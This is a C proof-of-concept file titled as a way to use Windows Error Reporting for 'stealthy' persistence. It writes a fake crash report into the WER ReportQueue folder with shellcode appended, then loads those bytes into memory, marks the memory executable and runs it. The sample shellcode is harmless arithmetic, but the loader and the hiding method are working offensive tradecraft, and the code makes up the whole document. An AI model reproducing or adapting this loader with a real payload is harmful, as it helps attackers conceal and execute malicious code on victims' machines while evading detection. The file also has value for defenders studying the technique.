/*
    Author      : Hossam Ehab
    Date        : February 11/2024
    Description : Leveraging Windows Error Reporting (WER) for Stealthy Data Persistence
    Links       : https://facebook/0xHossam, https://github.com/0xHossam 
*/

#include <Windows.h>
#include <stdio.h>

unsigned char shellcode[] = {
    0x90,                               // NOP (no operation)
    0x90,                               // NOP (no operation)
    0x90,                               // NOP (no operation)
    0x90,                               // NOP (no operation)
    0x6A, 0x05,                         // push 5     ; Push 5 onto the stack
    0x58,                               // pop eax    ; Pop value from stack into eax
    0x83, 0xC0, 0x03,                   // add eax, 3 ; Add 3 to eax
    0x83, 0xC0, 0x07,                   // add eax, 7 ; Add 7 to eax
    0x83, 0xC0, 0x0A,                   // add eax, 10; Add 10 to eax
    0x90,                               // NOP (no operation)
    0x90,                               // NOP (no operation)
    0xC3                                // ret        ; Return from function
};

void CreateFakeWERReportWithShellcode( const unsigned char* shellcode, int shellcodeSize, const char* reportPath ) {
    HANDLE hFile;
    DWORD dwBytesWritten = 0;

    hFile = CreateFile( reportPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL );
    if ( hFile == INVALID_HANDLE_VALUE ) {
        printf( "[!] Failed to open file %s\n", reportPath );
        return;
    }

    //Concatenate shellcode with the report content
    const char* reportContent = "This is a fake WER report. ";
    DWORD dwReportContentLength = strlen( reportContent );
    BOOL bErrorFlag = WriteFile( hFile, reportContent, dwReportContentLength, &dwBytesWritten, NULL );
    if ( !bErrorFlag || dwBytesWritten != dwReportContentLength ) {
        printf( "[!] Failed to write to %s\n", reportPath );
        CloseHandle( hFile );
        return;
    }

    //Write the shellcode to the report content
    bErrorFlag = WriteFile( hFile, shellcode, shellcodeSize, &dwBytesWritten, NULL );
    if ( !bErrorFlag || dwBytesWritten != shellcodeSize ) {
        printf( "[!] Failed to write shellcode to %s\n", reportPath );
        CloseHandle( hFile );
        return;
    }

    printf( "[+] Successfully wrote fake WER report with hidden shellcode to %s\n", reportPath );
    CloseHandle( hFile );
}

int main() {
    getchar();
    const char* reportPath = "C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue\\AppCrash_exampleapp.exe_fake-report.wer";
    
    printf( "[*] Creating fake WER report with hidden shellcode...\n" );
    CreateFakeWERReportWithShellcode( shellcode, sizeof( shellcode ), reportPath );

    LPVOID shellcodeAddress = VirtualAlloc( NULL, sizeof( shellcode ), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );  //Allocate memory for shellcode
    if ( shellcodeAddress == NULL ) {
        printf("[!] Failed to allocate memory for shellcode.\n");
        return 1;
    }

    LPVOID executionAddress = ( LPVOID )(( uintptr_t )shellcodeAddress );  //Calculate execution address
    printf( "[*] Memory allocation details:\n");
    printf( "    [+] Base Address: 0x%p\n", shellcodeAddress );
    printf( "    [+] Size: %d bytes\n", sizeof( shellcode ) );
    printf( "    [+] End Address: 0x%p\n", ( LPVOID )(( uintptr_t )shellcodeAddress + sizeof( shellcode )) );
    printf( "    [+] Memory Protection: PAGE_EXECUTE_READWRITE\n" );
    printf( "    [+] Execution Address: 0x%p\n", executionAddress );

    RtlMoveMemory( shellcodeAddress, shellcode, sizeof( shellcode ) ); //Copy shellcode to allocated memory
    DWORD oldProtection;
    if ( !VirtualProtect( shellcodeAddress, sizeof( shellcode ), PAGE_EXECUTE_READ, &oldProtection ) ) { //Change memory protection to execute
        printf( "[!] Failed to change memory protection.\n" );
        return 1;
    }

    printf( "\n[*] Executing shellcode...\n" );
    void ( *shellcodeFunc )() = ( void (*)() )executionAddress;  // Execute from the execution address
    shellcodeFunc();
    printf( "[+] Executed shellcode address: 0x%p\n", executionAddress );
    printf( "[*] Shellcode execution completed successfully!\n" );

    getchar();
    return 0;
}
